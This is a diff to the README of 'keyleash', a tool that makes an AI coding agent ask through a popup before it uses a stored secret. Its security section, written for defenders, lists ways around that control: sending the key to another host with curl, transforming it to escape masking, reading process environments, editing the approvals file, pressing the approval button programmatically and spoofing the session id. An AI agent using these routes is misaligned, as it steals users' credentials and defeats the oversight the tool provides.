@@ -12,7 +12,12 @@ Linux only, on any desktop with a Secret Service keyring (GNOME Keyring, KWallet
 agent:  keyleash run STRIPE_TEST_KEY -- curl -s -u "$STRIPE_TEST_KEY:" https://api.stripe.com/v1/balance
 you:    [popup]  An agent wants to use: STRIPE_TEST_KEY
                  Command: curl -s -u ... https://api.stripe.com/v1/balance
-                 [ Deny ]  [ Allow 30 min ]  [ Allow this session ]  [ Allow once ]
+                   ( ) Allow once
+                   (•) Allow curl commands this session
+                   ( ) Allow curl commands for 30 min
+                   ( ) Allow any command this session
+                   ( ) Allow any command for 30 min
+                 [ Deny ]  [ Allow ]
 agent sees the response, with the key shown as [secret:STRIPE_TEST_KEY] wherever it appears
 ```
 
@@ -48,16 +53,28 @@ manager (Passwords and Keys on GNOME); keyleash's items are labelled `keyleash: 
 ## Approvals
 
 The first use of a secret shows a popup with the secret's name, the exact command, the
-directory and the agent session. You choose:
+directory and the agent session. You pick how far the approval reaches, then **Allow** or
+**Deny**. Pressing Enter takes the ticked default.
 
-- **Allow once**: this command only.
-- **Allow 30 min**: any command using that secret until the time is up. Change the length with
-  `"grant_minutes"` in `~/.config/keyleash/config.json`.
-- **Allow this session**: until that agent session ends. Other sessions still have to ask.
-- **Deny**: the command is not run and exits with code 77.
+| Choice | Covers |
+|---|---|
+| Allow once | This command, this time. |
+| Allow *curl* commands this session (default) | Any command that runs the same program (`/usr/bin/curl`, matched by its real path, so a `./curl` next to it is not the same program), until the agent session ends. |
+| Allow *curl* commands for 30 min | The same, for any session, until the time is up. |
+| Allow any command this session | Any command using that secret, until the session ends. Fastest, and the widest. |
+| Allow any command for 30 min | Any command using that secret, from any session, until the time is up. |
 
-Closing the popup, or leaving it for two minutes, is a deny. Approvals live in
-`$XDG_RUNTIME_DIR/keyleash/grants.json`, which is in memory and gone when you log out.
+Programs that can run arbitrary code get **this exact command** instead of "*program*
+commands": shells, interpreters, wrappers and task runners (`sh`, `python`, `node`, `env`,
+`sudo`, `npx`, `npm`, `make`, `git`, `ssh`, `docker` and similar). Approving "`sh` commands"
+would approve everything, so for them the approval covers re-running the same command only.
+
+**Deny**, closing the popup, or leaving it for two minutes: the command is not run and exits
+with code 77. Settings in `~/.config/keyleash/config.json`: `"grant_minutes"` (default 30) and
+`"default_choice"` (`once`, `prog-session`, `prog-timed`, `any-session` or `any-timed`).
+
+Approvals live in `/run/user/<uid>/keyleash/grants.json`, which is in memory and gone when you
+log out. `keyleash grants` shows each one and what it covers.
 
 ## Where secrets are stored
 
@@ -77,11 +94,27 @@ every use something you agreed to. It is not a sandbox.
 
 - A command you approve receives the real value. Masking covers the value itself and its
   base64, hex and URL-encoded forms in the output; a command that transforms the value some
-  other way, or sends it over the network, is not stopped. Read the command in the popup.
+  other way (`printf %s "$KEY" | rev`), or sends it over the network, is not stopped. Read the
+  command in the popup.
+- **The popup is your review, so wider approvals review less.** After "*program* commands",
+  later commands running that program are not shown to you; after "any command", nothing is.
+  An approved program can still be pointed somewhere else (`curl -d "$KEY" https://elsewhere`).
+  Use "Allow once" for anything you would not hand over unseen.
+- Long commands are shown with their start and end and a warning; the middle is hidden. Deny a
+  command you cannot read in full.
+- While an approved command runs, its environment holds the value, and any program running as
+  you can read it (`ps e`, `/proc/<pid>/environ`). The hook blocks the agent from those
+  commands; a long-running server started through keyleash keeps the value for as long as it
+  runs.
 - Any program running as you can read an unlocked keyring, write the approvals file, or drive
   the desktop to press the approval button. The bundled hook blocks an agent from doing these
   by accident, but it is a fence, not a wall. It reads command text only, so a script written
-  to disk and then run is not inspected.
+  to disk and then run is not inspected. It watches Claude Code's Bash, Write, Edit, MultiEdit
+  and NotebookEdit tools; file tools added by MCP servers, and agents other than Claude Code
+  (which run no hooks), are not covered.
+- A message to the agent that contains something key-shaped (an `sk-…`, `ghp_…`, `AKIA…`
+  token, a private key, a JWT) is held back and not sent. Passwords and other secrets without
+  a recognisable shape are not detected.
 - "Allow this session" is tied to the session id the agent's environment reports
   (`CLAUDE_CODE_SESSION_ID`). A program can set that variable, so treat a session approval as
   "until that session ends", not as proof of who is asking.
